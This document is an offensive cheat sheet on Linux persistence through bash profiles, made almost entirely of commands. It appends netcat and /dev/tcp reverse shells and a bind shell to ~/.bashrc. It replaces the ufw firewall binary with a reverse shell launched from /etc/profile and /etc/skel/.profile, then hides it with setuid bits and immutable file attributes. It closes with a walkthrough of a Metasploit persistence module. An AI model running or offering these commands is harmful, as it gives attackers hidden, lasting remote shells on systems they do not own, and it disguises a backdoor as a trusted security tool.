# Bash Profiles

## 01 - Unix Shell

### 1.1 - User Profile

- Reverse Shell

```
$ echo "nc -e /bin/bash <IP> <PORT> 2>/dev/null &" >> ~/.bashrc

$ echo "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &" >> ~/.bashrc
```

Even when the user logs out the shell will still be running.

```
$ echo "nohup <commands> &" >> ~/.bashrc
```

- Bind Shell

`$ echo "nc -e /bin/bash -lnvp 8080 &" >> ~/.bashrc`

### 1.2 - Global System Profile

- Reverse Shell

```
$ sudo mv /usr/bin/ufw /tmp/ufw.bak

$ sudo echo "nc -e /bin/bash <IP> <PORT> 2>/dev/null &" > /usr/bin/ufw

$ sudo echo "/usr/bin/ufw &" >> /etc/profile

$ sudo echo "/usr/bin/ufw &" >> /etc/skel/.profile

$ sudo chmod +sss /usr/bin/ufw

$ chattr +i /etc/skel/.profile /etc/profile /usr/bin/ufw
```

## 02 - Metasploit

```
msf > use exploit/linux/local/bash_profile_persistence

msf exploit(linux/local/bash_profile_persistence) > options

Module options (exploit/linux/local/bash_profile_persistence):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   BASH_PROFILE  ~/.bashrc        yes       Target Bash profile location. Usually ~/.bashrc or ~/.bash_profile.
   PAYLOAD_DIR   /var/tmp/        yes       Directory to write persistent payload file.
   SESSION                        yes       The session to run this module on


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(linux/local/bash_profile_persistence) > set bash_profile </path/to/bash_rc_file>

msf exploit(linux/local/bash_profile_persistence) > set payload_dir </path/to/directory>

msf exploit(linux/local/bash_profile_persistence) > set lhost <IP>

msf exploit(linux/local/bash_profile_persistence) > set lport <PORT>

msf exploit(linux/local/bash_profile_persistence) > set session <session_id>

msf exploit(linux/local/bash_profile_persistence) > run
```

---
## References

- [[Linux Post Exploitation Persistence References]]